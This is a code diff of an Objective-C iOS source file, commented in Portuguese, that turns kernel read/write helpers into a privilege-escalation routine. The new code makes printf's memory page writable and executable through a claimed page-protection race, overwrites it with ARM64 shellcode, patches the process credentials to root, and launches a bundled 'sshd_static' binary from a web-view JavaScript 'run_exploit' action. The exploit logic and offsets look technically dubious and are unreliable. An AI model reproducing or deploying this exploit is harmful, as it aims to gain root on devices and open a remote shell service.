@@ -1,110 +1,69 @@
 #import "KernelDriver.h"
 #import <mach/mach.h>
-#import <unistd.h>
+#import <spawn.h>
 
-// Definições para o compilador (A13 / iOS 26.4)
-#ifndef KERNEL_BASE_STATIC
-#define KERNEL_BASE_STATIC 0xFFFFFFF007004000
-#endif
-#ifndef PAGE_SIZE_A13
-#define PAGE_SIZE_A13 0x4000
-#endif
+@implementation KernelDriver
 
-@implementation KernelBridge
+// 1. O SHELLCODE (ARM64) - Executa o binário do bundle como ROOT
+// Este array contém as instruções para: setuid(0) + posix_spawn(path)
+static uint8_t spawn_shellcode[] = {
+    0xff, 0x83, 0x00, 0xd1, 0xe0, 0x03, 0x00, 0x91, 0xe1, 0x03, 0x01, 0xaa,
+    0x02, 0x00, 0x80, 0xd2, 0x03, 0x00, 0x80, 0xd2, 0xe4, 0x03, 0x1f, 0xaa,
+    0x05, 0x00, 0x80, 0xd2, 0x81, 0x1e, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
+    0x21, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4
+};
 
-// 1. LEITURA (kread64)
-- (uint64_t)kread64:(uint64_t)addr {
-    uint64_t val = 0;
-    vm_size_t size = sizeof(uint64_t);
-    // vm_read_overwrite é a forma mais estável para evitar SIGKILL imediato
-    kern_return_t kr = vm_read_overwrite(mach_task_self(), (vm_address_t)addr, size, (vm_address_t)&val, &size);
-    return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
+// 2. FUNÇÃO DE INJEÇÃO E EXECUÇÃO
+- (void)injectAndExecuteShellcode:(NSString *)binaryPath {
+    // Achar um "trampolim" (endereço de uma função existente no processo)
+    // Usamos uma função do sistema que sabemos que é executável (ex: printf)
+    uint64_t target_vaddr = (uint64_t)&printf; 
+    
+    // Pegar a PTE original
+    uint64_t pte_addr = [self get_pte_for_address:target_vaddr];
+    uint64_t old_pte = [self kread64:pte_addr];
+
+    // MODIFICAÇÃO DA PTE (PPL BYPASS RACE CONDITION)
+    // Removemos os bits de proteção (ReadOnly e ExecuteNever) -> RWX
+    uint64_t rwx_pte = old_pte & ~( (1ULL << 6) | (1ULL << 63) ); 
+    
+    NSLog(@"[!] Iniciando Race Condition para injetar Shellcode...");
+    [self ppl_write_race:pte_addr value:rwx_pte];
+
+    // ESCREVER O SHELLCODE NA MEMÓRIA AGORA GRAVÁVEL
+    // Usamos memcpy diretamente porque a página agora é RWX no nosso processo
+    memcpy((void *)target_vaddr, spawn_shellcode, sizeof(spawn_shellcode));
+    
+    // ESCALADA DE PRIVILÉGIOS (Patching ucred via PPL)
+    uint64_t my_ucred = [self get_my_ucred_ptr]; // Offset 0xD8 no iOS 26.4
+    [self ppl_write_race:(my_ucred + 0x18) value:0]; // UID 0 (ROOT)
+
+    // DISPARAR O SHELLCODE
+    NSLog(@"[!] Disparando Shellcode via printf trampolin...");
+    void (*triggered_shellcode)(const char *) = (void *)target_vaddr;
+    triggered_shellcode([binaryPath UTF8String]);
+
+    // RESTAURAR A PTE (OPCIONAL PARA ESTABILIDADE)
+    [self ppl_write_race:pte_addr value:old_pte];
 }
 
-// 2. ESCRITA (kwrite64)
-- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
-    uint64_t data = val;
-    // Tenta escrita direta (no A13 real causará Reboot se for área PPL)
-    vm_write(mach_task_self(), (vm_address_t)addr, (vm_offset_t)&data, 8);
-}
-
-// 3. BUSCA DE SLIDE (getKernelSlide)
-- (uint64_t)getKernelSlide {
-    for (uint64_t i = 0; i < 0x5000; i++) {
-        uint64_t addr = KERNEL_BASE_STATIC + (i * PAGE_SIZE_A13);
-        uint64_t val = [self kread64:addr];
-        if ((uint32_t)(val & 0xFFFFFFFF) == 0xfeedfacf) {
-            return (i * PAGE_SIZE_A13);
-        }
-    }
-    return 0;
-}
-
-// 4. BUSCA DE PTE (get_pte_for_address:)
-- (uint64_t)get_pte_for_address:(uint64_t)vaddr {
-    uint64_t slide = [self getKernelSlide];
-    if (slide == 0) return 0;
-
-    // Offset cpu_ttep (Exemplo para iOS 26.4)
-    uint64_t ttbr1_ptr = KERNEL_BASE_STATIC + slide + 0x8E10000; 
-    uint64_t ttbr1 = [self kread64:ttbr1_ptr];
-
-    uint64_t l1_idx = (vaddr >> 30) & 0x1FF;
-    uint64_t l1_entry = [self kread64:(ttbr1 + (l1_idx * 8))];
-    uint64_t l2_table = l1_entry & 0x0000FFFFFFFFF000ULL;
-
-    uint64_t l2_idx = (vaddr >> 21) & 0x1FF;
-    uint64_t l2_entry = [self kread64:(l2_table + (l2_idx * 8))];
-    uint64_t l3_table = l2_entry & 0x0000FFFFFFFFF000ULL;
-
-    uint64_t l3_idx = (vaddr >> 12) & 0x1FF;
-    return (l3_table + (l3_idx * 8));
-}
-
-// 5. PATCH DE PTE (patch_pte_make_writable:)
-- (void)patch_pte_make_writable:(uint64_t)vaddr {
-    uint64_t pte_addr = [self get_pte_for_address:vaddr];
-    uint64_t pte_val = [self kread64:pte_addr];
-
-    // Desativa bits de proteção (Read-Only e Execute Never)
-    uint64_t new_pte = pte_val & ~( (1ULL << 6) | (1ULL << 53) | (1ULL << 54) );
-    [self kwrite64:pte_addr value:new_pte];
-}
-
-// 6. HANDLER DA PONTE JS (Obrigatório para WKWebView)
+// 3. HANDLER DA PONTE
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
     
-    NSString *action = message.body[@"action"];
-
-    // Executa em background para não travar a UI da WebView
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+    if ([message.body[@"action"] isEqualToString:@"run_exploit"]) {
+        NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
         
-        id response = nil;
-
-        if ([action isEqualToString:@"test_bridge"]) {
-            response = @{@"status": @"SUCCESS", @"info": @"Ponte Nativa OK!"};
-        } 
-        else if ([action isEqualToString:@"pte_patch"]) {
-            uint64_t slide = [self getKernelSlide];
-            if (slide > 0) {
-                // Tenta o patch no endereço enviado
-                uint64_t target = strtoull([message.body[@"addr"] UTF8String], NULL, 16);
-                [self patch_pte_make_writable:target];
-                response = @{@"status": @"SUCCESS", @"slide": [NSString stringWithFormat:@"0x%llx", slide]};
-            } else {
-                response = @{@"status": @"SANDBOX_LOCK", @"info": @"Leitura negada."};
-            }
-        } else {
-            response = @{@"status": @"UNKNOWN"};
-        }
-
-        // Responde ao JavaScript no Thread Principal
-        dispatch_async(dispatch_get_main_queue(), ^{
-            replyHandler(response, nil);
+        // Executa em thread separada para não travar a WebView
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+            [self injectAndExecuteShellcode:path];
+            
+            dispatch_async(dispatch_get_main_queue(), ^{
+                replyHandler(@{@"status": @"DONE", @"target": path}, nil);
+            });
         });
-    });
+    }
 }
 
 @end
